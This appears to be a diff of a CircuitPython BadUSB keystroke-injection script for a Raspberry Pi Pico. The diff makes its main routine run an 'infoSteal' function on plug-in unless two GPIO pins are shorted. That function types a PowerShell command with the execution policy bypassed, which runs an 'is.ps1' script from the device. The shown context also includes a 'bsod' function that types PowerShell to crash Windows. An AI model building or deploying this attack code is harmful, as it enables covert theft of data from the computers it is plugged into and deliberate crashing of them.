@@ -8,9 +8,11 @@ supervisor.runtime.autoreload = AutoReload
 import time
 import usb_hid # type: ignore
 import random
+import digitalio
+import board
 from adafruit_hid.keyboard import Keyboard
 from adafruit_hid.keycode import Keycode
-from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
+from adafruit_hid.keyboard_layout_us import KeyboardLayout
 from adafruit_hid.mouse import Mouse
 from adafruit_hid.consumer_control import ConsumerControl
 from adafruit_hid.consumer_control_code import ConsumerControlCode
@@ -18,12 +20,21 @@ import storage
 
 # Variables -----------------------------------------------------
 
+led = digitalio.DigitalInOut(board.LED)
+gpio2 = digitalio.DigitalInOut(board.GP2)
+gpio3 = digitalio.DigitalInOut(board.GP3)
+
+led.direction = digitalio.Direction.OUTPUT
+gpio2.direction = digitalio.Direction.OUTPUT
+
 kbd = Keyboard(usb_hid.devices)
 cc = ConsumerControl(usb_hid.devices)
-kbdl = KeyboardLayoutUS(kbd)
+kbdl = KeyboardLayout(kbd)
 mouse = Mouse(usb_hid.devices)
 
 picoName = "CIRCUITPY"
+
+gpio2.value = True 
 
 # Random Additions ----------------------------------------------
 
@@ -118,13 +129,15 @@ def getKeycode(dk):
 
 def pressKey(k):
     dk = getKeycode(k)
-    for i in dk:
-        kbd.press(i)
+    if dk:
+        for i in dk:
+            kbd.press(i)
 
 def releaseKey(k):
     dk = getKeycode(k)
-    for i in dk:
-        kbd.release(i)
+    if dk:
+        for i in dk:
+            kbd.release(i)
     
 def writeKeys(text, delay=0):
     for char in text:
@@ -139,21 +152,31 @@ def sendKeys(t,ed=.1, td=0):
     pressReleaseKey("enter")
     
 def pressReleaseKeys(k="ctrl", dk="v", delay=.1):
-    pressKey(k)
-    pressKey(dk)
-    Sleep(delay)
-    releaseKey(dk)
-    releaseKey(k)
+    try:
+        pressKey(k)
+        pressKey(dk)
+        Sleep(delay)
+        releaseKey(dk)
+        releaseKey(k)
+    except Exception as e:
+        # Emergency key release if something goes wrong
+        print(f"Error in pressReleaseKeys: {e}")
+        relAllKeys()
     
 def pressReleaseKey(k="enter", delay=.1):
-    if k in CC_MAP:
-        dk = getKeycode(k)
-        for i in dk:
-            cc.send(i)
-    else:
-        pressKey(k)
-        Sleep(delay)
-        releaseKey(k)
+    try:
+        if k in CC_MAP:
+            dk = getKeycode(k)
+            for i in dk:
+                cc.send(i)
+        else:
+            pressKey(k)
+            Sleep(delay)
+            releaseKey(k)
+    except Exception as e:
+        # Emergency key release if something goes wrong
+        print(f"Error in pressReleaseKey: {e}")
+        relAllKeys()
 
     
 # Useful Additions -------------------------------------------
@@ -327,11 +350,27 @@ def bsod():
     writeKeys('\n[bool]$enabled = $false\n[NativeMethods]::RtlAdjustPrivilege(19, $true, $false, [ref]$enabled)\n[int]$response = 0\n[NativeMethods]::NtRaiseHardError(0xC0000420, 0, 0, [IntPtr]::Zero, 6, [ref]$response)\n')
     
 def infoSteal():
-    pressReleaseKeys("win", "r")
-    Sleep(1.5)
-    sendKeys('powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$v=Get-Volume|?{$_.FileSystemLabel -eq \'' + picoName + '\'};$p=$v.DriveLetter+\':\\\\is.ps1\';iex \\"& \'$p\'\\""',td=0)
+    try:
+        pressReleaseKeys("win", "r")
+        Sleep(1.5)
+        sendKeys('powershell -ExecutionPolicy Bypass -Command "$v=Get-Volume|?{$_.FileSystemLabel -eq \'' + picoName + '\'};$p=$v.DriveLetter+\':\\\\is.ps1\';iex \\"& \'$p\'\\""',td=0)
+    except Exception as e:
+        print(f"Error in infoSteal: {e}")
+        relAllKeys()
 # Main Func --------------------------------------------------
 
 def main():
-    
+    try:
+        if gpio3.value == False:
+            Sleep(1)
+            infoSteal()
+        elif gpio3.value == True:
+            print("GPIO2 and GPIO3 is shorted, exiting")
+    except Exception as e:
+        print(f"Error in main: {e}")
+    finally:
+        # Always release all keys at the end to prevent stuck keys
+        relAllKeys()
+        Sleep(0.1)  # Small delay to ensure release is processed
+
 main() 
